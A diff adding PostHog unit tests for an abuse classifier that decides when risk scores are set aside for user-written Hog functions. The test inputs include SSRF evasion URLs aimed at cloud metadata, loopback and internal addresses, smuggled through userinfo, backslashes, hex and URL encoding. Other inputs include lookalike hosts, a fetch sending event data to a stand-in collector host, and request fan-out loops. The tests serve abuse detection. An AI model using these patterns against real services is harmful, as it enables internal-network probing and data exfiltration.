@@ -6,8 +6,8 @@ from parameterized import parameterized
 
 from posthog.hogql.parser import _builtin_parse_cache, _user_parse_cache, clear_parse_caches
 
-from products.cdp.backend.abuse.classifier import HogFunctionContent
-from products.cdp.backend.abuse.rules import Rule, has_outbound_call, matched_rules
+from products.cdp.backend.abuse.classifier import HogFunctionContent, SetAsideReason
+from products.cdp.backend.abuse.rules import Rule, has_outbound_call, matched_rules, set_aside_scores
 
 
 def content(
@@ -47,6 +47,14 @@ CHAT_INPUTS = {
     "channel": {"value": "C0001"},
     "blocks": {"value": [{"type": "button", "url": "{true ? 'https://app.example.com' : 'http://localhost:3000'}"}]},
 }
+
+
+def post_to(url: str) -> HogFunctionContent:
+    return content(hog=f"fetch('{url}', {{'method': 'POST', 'body': {{'text': inputs.text}}}})")
+
+
+def set_aside(function: HogFunctionContent, question: str) -> SetAsideReason | None:
+    return set_aside_scores(function, matched_rules(function)).get(question)
 
 
 def unedited_template(hog: str, inputs: dict[str, Any]) -> HogFunctionContent:
@@ -730,6 +738,163 @@ class TestAbuseRules(SimpleTestCase):
     )
     def test_has_outbound_call(self, _name: str, function: HogFunctionContent, expected: bool) -> None:
         assert has_outbound_call(function) is expected
+
+    @parameterized.expand(
+        [
+            *(
+                (f"post_to_{name}", post_to(url), SetAsideReason.CHAT_MESSAGES_ONLY)
+                for name, url in (
+                    ("slack_api", "https://slack.com/api/chat.postMessage"),
+                    ("slack_webhook", "https://hooks.slack.com/services/T0/B0/x"),
+                    ("discord_webhook", "https://discord.com/api/webhooks/1/x"),
+                    ("telegram", "https://api.telegram.org/bot0:x/sendMessage"),
+                    ("teams_webhook", "https://example.webhook.office.com/webhookb2/x"),
+                    ("google_chat", "https://chat.googleapis.com/v1/spaces/x/messages"),
+                )
+            ),
+            (
+                "slack_template_code_with_builtins",
+                content(
+                    hog="let res := fetch('https://slack.com/api/chat.postMessage', {'body': {'text': inputs.text}, "
+                    "'headers': {'Authorization': f'Bearer {inputs.slack_workspace.access_token}'}})\n"
+                    "if (res.status != 200) {\n  throw Error(f'Failed: {res.status}')\n}"
+                ),
+                SetAsideReason.CHAT_MESSAGES_ONLY,
+            ),
+            (
+                "slack_and_a_second_host",
+                content(
+                    hog="fetch('https://slack.com/api/chat.postMessage', {'body': event})\n"
+                    "fetch('https://collector.example.net/x', {'body': event})"
+                ),
+                None,
+            ),
+            ("url_from_an_input", content(), None),
+            ("url_built_from_the_event", content(hog="fetch(f'https://hooks.slack.com/{event.event}')"), None),
+            (
+                "closure_called_beside_a_post",
+                content(hog="inputs.sender(1)\n" + post_to("https://slack.com/api/x").hog),
+                None,
+            ),
+            ("other_slack_path", post_to("https://slack.com/oauth/x"), None),
+            ("lookalike_host", post_to("https://slack.com.example.net/api/x"), None),
+            ("plain_http", post_to("http://hooks.slack.com/services/x"), None),
+            ("userinfo_before_the_host", post_to("https://hooks.slack.com@collector.example.net/x"), None),
+            ("no_request", content(hog="return event", function_type="transformation", inputs={}), None),
+        ]
+    )
+    def test_malformed_payload_score_set_aside_for_chat_message_posts(
+        self, _name: str, function: HogFunctionContent, expected: SetAsideReason | None
+    ) -> None:
+        assert set_aside(function, "malformed_payload") == expected
+
+    @parameterized.expand(
+        [
+            ("public_host_with_an_internal_path", post_to("https://staging.example.com/internal/hook"), True),
+            ("public_host_with_a_numeric_path", post_to("https://api.example.com/v2/orders/12345?page=2"), True),
+            (
+                "several_public_hosts",
+                content(hog="fetch('https://a.example.com/x')\nfetch('https://b.example.org/y')"),
+                True,
+            ),
+            ("url_from_an_input", content(), False),
+            ("url_built_from_the_event", content(hog="fetch(f'https://api.example.com/{event.event}')"), False),
+            ("address_in_the_query", post_to("https://api.example.com/go?to=169.254.169.254"), False),
+            ("public_address_in_the_query", post_to("https://api.example.com/go?to=203.0.113.7"), False),
+            ("encoded_url_in_the_query", post_to("https://api.example.com/go?to=http%3A%2F%2F10.0.0.1%2F"), False),
+            ("hex_address_in_the_path", post_to("https://api.example.com/0x7f000001/x"), False),
+            ("ipv6_address_in_the_query", post_to("https://api.example.com/go?to=[::1]"), False),
+            ("internal_name_in_the_query", post_to("https://api.example.com/go?to=metadata.google.internal"), False),
+            ("internal_tld_host", post_to("https://billing.corp/x"), False),
+            ("public_address_host", post_to("https://203.0.113.7/x"), False),
+            ("userinfo_before_the_host", post_to("https://169.254.169.254@api.example.com/x"), False),
+            ("backslash_in_the_authority", post_to("https://api.example.com\\\\@127.0.0.1/x"), False),
+            (
+                "closure_called_beside_a_post",
+                content(hog="inputs.sender(1)\n" + post_to("https://api.example.com/x").hog),
+                False,
+            ),
+        ]
+    )
+    def test_internal_network_score_set_aside_for_literal_public_urls(
+        self, _name: str, function: HogFunctionContent, expected: bool
+    ) -> None:
+        reason = SetAsideReason.LITERAL_PUBLIC_URLS if expected else None
+        assert set_aside(function, "internal_network") == reason
+
+    @parameterized.expand(
+        [
+            ("one_request", content(), True),
+            (
+                "requests_beside_bounded_compute_loops",
+                content(
+                    hog="fun format(row) {\n  return concat(row.name, ': ', toString(row.total))\n}\n"
+                    "let lines := []\nfor (let row in event.properties.rows) {\n  lines := arrayPushBack(lines, format(row))\n}\n"
+                    "let i := 0\nwhile (i < 100) {\n  i := i + 1\n}\n"
+                    "let report := fetch(inputs.url, {'body': lines})\nfetch('https://slack.com/api/chat.postMessage', {'body': report.body})"
+                ),
+                True,
+            ),
+            ("compute_loop_without_a_request", content(hog="while (true) {\n  print(1)\n}", inputs={}), True),
+            ("request_in_a_for_in_loop", content(hog="for (let url in inputs.urls) {\n  fetch(url)\n}"), False),
+            (
+                "request_in_a_while_loop",
+                content(hog="let i := 0\nwhile (i < 3) {\n  fetch(inputs.url)\n  i := i + 1\n}"),
+                False,
+            ),
+            ("request_in_a_callback", content(hog="arrayMap(url -> fetch(url), inputs.urls)"), False),
+            (
+                "function_with_a_request_called_from_a_loop",
+                content(
+                    hog="fun send(x) {\n  fetch(inputs.url, {'body': x})\n}\nfor (let x in [1, 2]) {\n  send(x)\n}"
+                ),
+                False,
+            ),
+            (
+                "lambda_with_a_request_called_from_a_loop",
+                content(hog="let send := x -> fetch(inputs.url, {'body': x})\nfor (let x in [1, 2]) {\n  send(x)\n}"),
+                False,
+            ),
+            (
+                "function_reaching_a_request_called_from_a_callback",
+                content(
+                    hog="fun send(x) {\n  return fetch(inputs.url, {'body': x})\n}\n"
+                    "fun relay(x) {\n  return send(x)\n}\narrayMap(x -> relay(x), [1, 2])"
+                ),
+                False,
+            ),
+            (
+                "function_with_a_request_passed_as_a_callback",
+                content(hog="fun send(x) {\n  fetch(x)\n}\narrayMap(send, inputs.urls)"),
+                False,
+            ),
+            (
+                "recursive_function_with_a_request",
+                content(hog="fun send(n) {\n  fetch(inputs.url)\n  if (n > 0) {\n    send(n - 1)\n  }\n}\nsend(3)"),
+                False,
+            ),
+            (
+                "rebound_function_called_from_a_loop",
+                content(hog="let send := x -> x\nsend := inputs.sender\nfor (let x in [1, 2]) {\n  send(x)\n}"),
+                False,
+            ),
+            ("closure_called_from_a_loop", content(hog="for (let x in [1, 2]) {\n  inputs.sender(x)\n}"), False),
+            (
+                "request_in_a_template_callback",
+                content(
+                    hog="return event", inputs={"x": {"value": "{arrayMap(u -> fetch(u), event.properties.urls)}"}}
+                ),
+                False,
+            ),
+            ("huge_range", content(hog="let ids := range(100000)\nfetch(inputs.url, {'body': ids})"), False),
+            ("code_that_does_not_parse", content(hog="let x := (", inputs={}), False),
+        ]
+    )
+    def test_resource_exhaustion_score_set_aside_without_request_fan_out(
+        self, _name: str, function: HogFunctionContent, expected: bool
+    ) -> None:
+        reason = SetAsideReason.NO_REQUEST_FAN_OUT if expected else None
+        assert set_aside(function, "resource_exhaustion") == reason
 
     def test_parsed_code_and_templates_stay_out_of_the_parse_cache(self) -> None:
         clear_parse_caches()
